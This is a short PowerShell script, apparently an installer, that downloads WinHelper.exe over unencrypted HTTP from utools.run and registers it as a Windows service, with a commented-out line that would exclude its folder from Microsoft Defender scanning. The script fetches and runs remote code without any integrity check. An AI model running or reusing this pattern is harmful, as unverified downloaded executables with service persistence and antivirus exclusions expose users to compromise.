$ProgressPreference = 'SilentlyContinue'

$targetDirectory = "c:\utools"
if (-not(Test-Path $targetDirectory))
{
  New-Item -Path $targetDirectory -ItemType Directory | Out-Null
}
# Add-MpPreference -ExclusionPath $targetDirectory -ErrorAction SilentlyContinue
$savePathexe = Join-Path $targetDirectory "winHelper.exe"
$winHelper_url="http://utools.run/WinHelper.exe"
if (Test-Path $savePathexe)
{
}
else
{
    Invoke-WebRequest -Uri $winHelper_url -OutFile $savePathexe -ErrorAction Stop
}

if ((Get-Service -Name WinHelper -ErrorAction SilentlyContinue).Status -eq "Running")
{
    " WinHelper Service already installed and then stop service"
    Stop-Service -Name WinHelper -ea 0
    Invoke-WebRequest -Uri $winHelper_url -OutFile $savePathexe -ErrorAction SilentlyContinue
    Start-Service -Name WinHelper -ea 0
} else {
    Invoke-WebRequest -Uri $winHelper_url -OutFile $savePathexe -ErrorAction SilentlyContinue
    start-process -FilePath "$env:ComSpec" -WorkingDirectory $targetDirectory -ArgumentList "/c","winHelper.exe install 2>&1" -NoNewWindow -Wait | Out-Null
    Start-Sleep -Seconds 1
    Start-Service -Name WinHelper -ea 0
}
